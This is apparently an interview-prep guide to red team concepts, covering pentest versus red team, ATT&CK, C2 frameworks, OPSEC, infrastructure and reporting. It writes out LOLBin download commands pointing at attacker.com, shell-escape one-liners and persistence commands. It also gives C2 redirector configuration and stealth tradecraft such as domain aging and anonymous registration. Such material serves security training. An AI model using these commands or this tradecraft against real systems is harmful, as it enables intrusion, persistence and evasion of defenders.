# Red Team Concepts

!!! info "Why This Matters"
    Understanding red team methodology separates a senior pentester from someone who's only done compliance-driven VAPT. Red teaming is adversary simulation — the philosophy is completely different from a penetration test. Interviewers ask about this distinction constantly when hiring for senior roles.

---

## Red Team vs Penetration Test — The Core Distinction

This is the most important conceptual difference to articulate clearly in an interview.

| Dimension | Penetration Test | Red Team |
|-----------|-----------------|----------|
| **Goal** | Find as many vulnerabilities as possible | Achieve defined objectives while evading detection |
| **Scope** | Defined IP ranges, applications | Broad — "simulate threat actor X against this org" |
| **Duration** | Days to weeks | Weeks to months |
| **Footprint** | Active, thorough | Minimal — only what's needed for objectives |
| **Blue team aware?** | Often yes | No — tests detection and response |
| **Report focus** | Vulnerability list | Attack narrative, detection gaps, MITRE TTPs |
| **Success metric** | Vulnerabilities found | Objectives achieved OR detected |
| **Methodology** | PTES, OWASP | MITRE ATT&CK, threat actor emulation |

**Key insight:** A red teamer might intentionally walk past a known vulnerability if exploiting it would trigger detection — because the goal is objective achievement, not enumeration. A pentester would exploit it to demonstrate impact.

---

## Threat Intelligence-Led Red Teaming

Modern red team engagements start with a threat intelligence profile of which threat actors are most likely to target the organization.

**TIBER-EU (Threat Intelligence-Based Ethical Red Teaming):** European framework for financial sector red teaming. Requires a threat intelligence phase to identify likely adversary TTPs before testing begins.

**CBEST (UK):** Similar framework from the Bank of England for UK financial institutions.

**Why this matters:** A retail bank is more likely targeted by financially motivated threat actors (FIN7, Carbanak) than by nation-state APTs. A defense contractor has the opposite profile. Red team tactics should emulate the *actual* threat actors relevant to the client.

---

## MITRE ATT&CK Framework

ATT&CK is the standard vocabulary for red team reporting. Every technique in the framework has a TID (technique ID) that maps to real threat actor usage.

**Tactics (the "why" — attacker's current goal):**

1. **Reconnaissance** (TA0043) — Info gathering before engagement
2. **Resource Development** (TA0042) — Acquiring infrastructure, tools, accounts
3. **Initial Access** (TA0001) — Getting a foothold
4. **Execution** (TA0002) — Running code on target
5. **Persistence** (TA0003) — Maintaining access across reboots/logoffs
6. **Privilege Escalation** (TA0004) — Getting higher privileges
7. **Defense Evasion** (TA0005) — Avoiding detection
8. **Credential Access** (TA0006) — Stealing credentials
9. **Discovery** (TA0007) — Learning about the environment
10. **Lateral Movement** (TA0008) — Moving through the network
11. **Collection** (TA0009) — Gathering target data
12. **Command and Control** (TA0011) — Communicating with implants
13. **Exfiltration** (TA0010) — Getting data out
14. **Impact** (TA0040) — Achieving final objectives (ransomware, destruction, manipulation)

**In a red team report:** Every action taken is mapped to an ATT&CK TID. The detection gap analysis shows which techniques were detected and which weren't — giving the blue team a prioritized improvement roadmap.

---

## C2 Frameworks — Concepts

Command and Control (C2) frameworks manage communications between the operator and implants running on compromised systems.

### Architecture

```
Operator (attacker's machine)
    │
    ↓ (HTTPS/DNS/custom protocol)
C2 Server (team server / listener infrastructure)
    │
    ↓ (callback from implant)
Implant (beacon/agent running on compromised host)
```

### Major Frameworks Used in Authorized Red Teams

**Cobalt Strike:** Industry standard for commercial red teams. Uses "Beacons" as implants. Highly configurable Malleable C2 profiles allow mimicking specific threat actor traffic patterns. The Aggressor Script API enables custom automation.

**Havoc:** Open-source, modern alternative. Supports multiple agent types, custom protocols.

**Sliver:** Open-source C2 from BishopFox. Supports multiple protocols (mTLS, WireGuard, HTTP/S, DNS). Good for teams that need a free, extensible option.

**Brute Ratel C4:** Commercial alternative with strong evasion capabilities.

**Metasploit Framework:** Has C2 capabilities via Meterpreter stages, but less suited for long-term stealth operations compared to dedicated red team frameworks.

### Key C2 Concepts

**Sleep and jitter:** Beacons don't call back constantly — they sleep for a configured interval (e.g., 60 seconds) with random jitter (±20%) to avoid predictable traffic patterns. Low-and-slow: `sleep 300 25` = 5-minute callbacks ±25%.

**Malleable C2 profiles (Cobalt Strike):** Configure exactly what the beacon's HTTP traffic looks like — URI, headers, user-agent, how data is encoded. Profiles exist to mimic Amazon S3, Google Analytics, Bing, and other legitimate services to blend into normal traffic.

**Channels:** Operators issue tasking through the team server; beacons poll for tasks, execute them, and return output. Everything is asynchronous.

**Pivoting through C2:** Once you have a beacon on an internal host, you can route additional beacon traffic through it to reach otherwise-unreachable internal systems.

---

## OPSEC — Operational Security

OPSEC is about limiting the evidence you leave behind. In a red team, poor OPSEC gets you detected before achieving objectives. Understanding OPSEC also helps pentesters when stealth is required.

### Infrastructure OPSEC

**Redirectors:** Never expose your team server IP directly. Use intermediate servers (redirectors) that proxy traffic to the team server. If the redirector is blocked, you stand up a new one — the team server remains hidden.

```
Beacon → Redirector (cheap VPS) → Team Server
```

**Domain categorization:** Register domains weeks or months in advance (domain aging). Categorize them as benign (news, finance, technology) so corporate proxies don't block them on first connection. Use domains with clean reputation scores.

**HTTP vs HTTPS vs DNS C2:**
- **HTTPS** blends with normal web traffic. SSL inspection can reveal C2 if not using a trusted cert.
- **DNS C2:** Extremely hard to block — DNS is required for normal operation. Slow (limited bandwidth) but very resilient. Data encoded in DNS queries (subdomains).
- **Domain Fronting:** Use a legitimate CDN (Cloudflare, Azure Front Door) as the apparent destination while routing to your C2. Makes blocking your C2 look like blocking the CDN.

### Host OPSEC

**Avoid writing to disk:** Fileless techniques keep payloads in memory only. No artifacts for forensic tools to find after the engagement.

**Timestomping:** Modify file timestamps to blend with existing file metadata (controversial — can indicate malicious intent, only in simulated scenarios with explicit authorization).

**Log awareness:** Windows event logs, PowerShell logging (ScriptBlock logging, Module logging, Transcription), ETW (Event Tracing for Windows), Sysmon — know what generates events and minimize unnecessary events.

**Indicator removal:** At engagement end, remove implants, scheduled tasks, registry keys, and any files placed on systems. Document everything you did so it can all be cleaned.

---

## Living-Off-the-Land (LOLBins/LOLBas)

Using built-in OS tools and binaries for attacker objectives instead of custom malware. Harder to detect because legitimate security tools use these same binaries.

### Windows LOLBins

```powershell
# Execution via built-in tools
certutil.exe -urlcache -split -f http://attacker.com/payload.exe C:\payload.exe
# certutil = SSL cert tool, also downloads files

mshta.exe http://attacker.com/payload.hta
# mshta = HTA (HTML Application) host — executes VBScript/JScript

regsvr32.exe /s /n /u /i:http://attacker.com/payload.sct scrobj.dll
# regsvr32 = register COM DLL — also runs remote scriptlets (Squiblydoo)

rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";eval("...")
# rundll32 = run DLL exports — can execute JavaScript

wmic.exe process call create "powershell.exe -enc BASE64"
# WMI process creation — evades some process monitoring

msiexec.exe /i http://attacker.com/payload.msi
# Windows Installer — downloads and installs MSI from URL

bitsadmin /transfer job http://attacker.com/payload.exe C:\payload.exe
# BITS = Background Intelligent Transfer Service — background downloader

# Lateral movement LOLBins
wmic /node:target process call create "cmd.exe /c payload.exe"
# WMI remote process execution

sc.exe \\target create MySvc binPath= "cmd.exe /c payload.exe"
sc.exe \\target start MySvc
# Service creation for remote execution

# Reference: lolbas-project.github.io — complete catalog
```

### Linux LOLBins

```bash
# File download
curl -o payload http://attacker.com/payload
wget http://attacker.com/payload
python3 -c "import urllib.request; urllib.request.urlretrieve('http://attacker.com/payload', '/tmp/payload')"

# Code execution bypass
perl -e 'exec "/bin/bash"'
python3 -c 'import os; os.system("/bin/bash")'
awk 'BEGIN {system("/bin/bash")}'
find . -exec /bin/bash \; -quit
vim -c ':!/bin/bash'
less /etc/hosts  # then: !/bin/bash

# Reference: gtfobins.github.io
```

---

## Initial Access Techniques

How red teams establish the first foothold — mapped to ATT&CK TA0001.

**Phishing (T1566):** Spear-phishing emails with:
- Malicious document attachments (macro-enabled Office docs, PDF with embedded exploit)
- Links to credential harvesting pages (Microsoft 365 lookalikes)
- Links to malware downloads

**Drive-by Compromise (T1189):** Watering hole attacks — compromise a site the target organization's employees visit, serve malicious content.

**Valid Accounts (T1078):** Credentials obtained via OSINT (breached credential databases), phishing, or purchased on dark web forums. Log in directly — no exploitation needed.

**Exploit Public-Facing Application (T1190):** Vulnerable internet-facing application (VPN appliance, web application, Citrix, Exchange).

**External Remote Services (T1133):** VPN, Citrix, RDP, SSH — credential stuffing or exploitation.

**Supply Chain Compromise (T1195):** Compromise a software vendor or managed service provider that has access to the target organization.

---

## Persistence Mechanisms

Maintaining access across reboots, logoffs, and credential changes — ATT&CK TA0003.

```powershell
# Registry Run keys
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v Updater /t REG_SZ /d "C:\payload.exe"

# Scheduled Task
schtasks /create /tn "Windows Update" /tr "C:\payload.exe" /sc onlogon /ru System

# Windows Service
sc create MySvc binpath= "C:\payload.exe" start= auto

# Startup folder
copy payload.exe "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\"

# WMI event subscription (fileless persistence)
# Survives reboots, no files on disk — uses WMI event infrastructure

# COM object hijacking
# Replace legitimate COM registration with malicious DLL path

# DLL side-loading
# Place malicious DLL in directory searched before legitimate DLL location
```

---

## Detection Evasion Concepts

Understanding how defenders detect threats helps red teamers operate more stealthily — and helps blue teamers build better detection.

**AMSI (Antimalware Scan Interface):** Windows interface that allows AV/EDR to scan scripts (PowerShell, VBScript, JScript) before execution. AMSI bypass techniques modify AMSI in memory to disable scanning — a cat-and-mouse game with Microsoft.

**ETW (Event Tracing for Windows):** High-performance logging infrastructure used by EDR to collect telemetry. Techniques exist to patch ETW providers in memory, but modern EDRs detect these patches.

**Process Injection:** Running malicious code within a legitimate process (explorer.exe, svchost.exe) to evade process-based detection. Techniques: Classic DLL injection, Process Hollowing, Thread Execution Hijacking, APC injection, etc.

**Signed Binary Proxy Execution:** Using legitimately signed Microsoft binaries (LOLBins) to execute malicious code — these are trusted by application whitelisting and some AV.

**Timestomping, Log Clearing:** Anti-forensics to remove evidence of activity.

**The arms race:** EDR vendors continuously improve detection of these techniques. Effective red teams research current EDR detection logic and test evasion — this is why red team skills require constant updating.

---

## Red Team Infrastructure Management

Infrastructure is as important as technique. Poor infrastructure management exposes the red team's identity and can cause unintended harm.

### Redirector Architecture

Never expose your team server directly. The standard pattern:

```
Target Network → Internet → Redirector VPS → Team Server (hidden)

Benefits:
- If blue team blocks the redirector IP, stand up a new one in minutes
- Team server IP never appears in target logs
- Multiple redirectors can be active simultaneously (redundancy)
- Each redirector can serve different profiles for different implants

Redirector configuration (nginx example):
server {
    listen 443 ssl;
    ssl_certificate /path/to/cert.pem;
    ssl_certificate_key /path/to/key.pem;
    
    # Only forward specific URI patterns (matching C2 profile)
    location /updates/client {
        proxy_pass https://TEAMSERVER_IP;
        proxy_set_header Host $host;
    }
    
    # Default: serve legitimate-looking content
    location / {
        return 302 https://www.microsoft.com/;
    }
}
```

### Domain and SSL Certificate Management

```
Domain selection criteria:
1. Age: Register domain at least 30 days before use (domain aging)
   - New domains are often flagged by threat intel feeds
   - Sites like DomainHistory.net, Whoisology for checking domain age
   
2. Categorization: Ensure domain is categorized as benign
   - Blue Coat / WebPulse: sitereview.bluecoat.com
   - Palo Alto URL Filtering: urlfiltering.paloaltonetworks.com
   - Cisco Talos: talosintelligence.com/reputation_center
   - Target: "Business and Economy", "Technology", "Information Technology"
   
3. Clean reputation: No malware associations
   - VirusTotal: virustotal.com/gui/domain/yourdomain.com
   - Should show 0 detections
   
4. Similar to legitimate traffic: Domain name should look plausible
   - cdn-updates[.]net (CDN pattern)
   - telemetry-service[.]com (analytics pattern)
   - Not: totally-a-c2-server[.]com

SSL certificates:
- Use Let's Encrypt for free valid certificates (legitimate CA = passes inspection)
- Wildcard cert for *.yourdomain.com covers all subdomains
- Certificate lifetime: Let's Encrypt = 90 days, automate renewal
- Certificate transparency: Your cert will appear in CT logs — use a privacy-aware CA 
  or accept this and include it in OPSEC considerations
```

### OPSEC Failure Case Studies

**Case: Reusing infrastructure across engagements**
Red team used the same C2 domain across three separate client engagements over six months. The second client's threat intel team searched for the domain and found it associated with the first client's incident report (publicly disclosed). The red team's cover was blown before the engagement started.
*Lesson:* Fresh infrastructure per engagement. Never reuse domains or IPs.

**Case: C2 traffic too distinctive**
Red team used a custom C2 protocol that used port 4444 and had a distinctive HTTP User-Agent. The blue team's SIEM had a rule for that exact User-Agent string from a previous threat intel feed. The red team was detected within 30 minutes.
*Lesson:* Use industry-standard C2 frameworks with well-tested profiles that mimic legitimate traffic. Customize user-agents and patterns before deployment.

**Case: Personal email for domain registration**
Red team member registered the C2 domain with their personal email address. The blue team, upon discovering the domain, queried WHOIS and found the operator's name.
*Lesson:* Use privacy protection for WHOIS. Use anonymous email (ProtonMail) and payment (prepaid cards) for infrastructure registration.

---

## Red Team Reporting — What Makes It Different

Red team reports tell a story. They're not vulnerability lists — they're attack narratives that show the full path from initial access to objective completion.

### Narrative Structure

```
Phase 1: Initial Foothold (Day 1-3)
  Attack vector used: spear phishing email to finance department
  Lure: "Q4 invoice requiring signature" with malicious macro-enabled attachment
  Result: Initial access via macro execution on finance workstation FINANCE-WS-04
  User: sarah.johnson@corp.local (Finance Analyst)
  MITRE: T1566.001 (Spear Phishing Attachment), T1059.005 (Visual Basic)

Phase 2: Discovery and Lateral Movement (Day 4-8)
  From FINANCE-WS-04, enumerated local network:
    - Identified domain controllers: DC01, DC02
    - Identified file servers: FILESERVER01, FILESERVER02
  Credential access: Kerberoasting identified 3 service accounts with weak passwords
    - svc_backup: ServiceAccount1! (cracked in 4 hours)
    - svc_scanner: Scanner2023 (cracked in 2 hours)
    - svc_reporting: Reporting#1 (cracked in 6 hours)
  Lateral movement: svc_backup had local admin on all servers in SERVERS OU
  MITRE: T1558.003, T1078, T1570

Phase 3: Privilege Escalation (Day 9-11)
  svc_backup was member of "Backup Operators" group
  Used Backup Operators privilege to read NTDS.dit remotely
  Extracted all 2,847 domain account hashes via VSS
  Identified DA accounts: administrator, admin_jsmith, svc_dba
  Performed DCSync using svc_dba hash → confirmed Domain Admin access
  MITRE: T1003.003 (NTDS), T1003.006 (DCSync)

Phase 4: Objective Achievement (Day 12-14)
  Objective: Access financial transaction database
  Path: DA access → SQL Server hosting finance DB → Database access
  Accessed: tblTransactions (2.3M records), tblAccountBalances
  Exfiltration simulation: Compressed and staged 500MB sample to staging directory
  Note: Actual exfiltration not performed per ROE — demonstrated capability only
  MITRE: T1213, T1005, T1002
```

### Detection Analysis Section

This is what differentiates red team from pentest reports — systematic analysis of what the blue team caught and what they missed.

```
DETECTION ANALYSIS

Techniques executed: 47
Detected by SOC: 12 (25%)
Not detected: 35 (75%)

Detection successes:
- Phishing email blocked by email gateway on first attempt
  (Red team used second lure — success on attempt 2)
- PowerShell download cradle detected within 4 minutes (excellent)
- Mimikatz signature blocked by Defender (red team used alternative tool)

Detection failures (high priority gaps):
- Kerberoasting: 0 of 3 attempts detected
  Recommendation: Alert on Event 4769 with EncryptionType=0x17 (RC4),
  3+ tickets within 5 minutes from single source
  
- NTDS backup via VSS: Not detected
  Recommendation: Alert on VSS shadow copy creation followed by access 
  to NTDS.dit or SAM hive within 30 minutes

- DCSync from non-DC IP: Not detected
  Recommendation: Alert on Event 4662 with Property 
  {1131f6aa-9c07-11d1-f79f-00c04fc2dcd2} from non-DC IP addresses
  
- Large file staging to temp directory: Not detected
  Recommendation: Alert on file creation >100MB in 
  C:\Windows\Temp or C:\Users\*\AppData\Local\Temp

Mean time to detect (when detected): 4.2 hours
Mean time to respond (when detected): 18 hours
Recommended target (next engagement): MTTD <2 hours, MTTR <4 hours
```

---

## Red Team vs Pentest — Interview Depth

At senior level you must be able to articulate this distinction precisely, not just broadly.

| Dimension | Penetration Test | Red Team |
|-----------|-----------------|----------|
| Primary question | "What vulnerabilities exist?" | "Can a specific threat actor achieve a specific objective?" |
| Success metric | Number/severity of findings | Objective achieved / Detection triggered |
| Scope of findings | Report every vulnerability found | Report only what's necessary to tell the story |
| Blue team role | Often aware | Not aware (tests real detection capability) |
| Reporting audience | Technical + Management | CISO + Leadership (strategic level) |
| Methodology | PTES / OWASP (systematic) | Threat actor TTP emulation |
| Footprint | Active, thorough | Minimal — only what's needed for objective |
| Duration | Days to weeks | Weeks to months |
| MITRE ATT&CK role | Reference for finding classification | Drives TTP selection and coverage measurement |

**When a client asks for a "red team" but really needs a pentest:**
This is common. If they have no SOC, limited detection capability, and haven't fixed last year's pentest findings — a red team will just demonstrate that a motivated attacker would succeed (already obvious) without giving them the vulnerability list they actually need to improve. Recommend sequential: pentest first to find and fix the low-hanging fruit, then red team once defenses are mature enough that the test is actually meaningful.
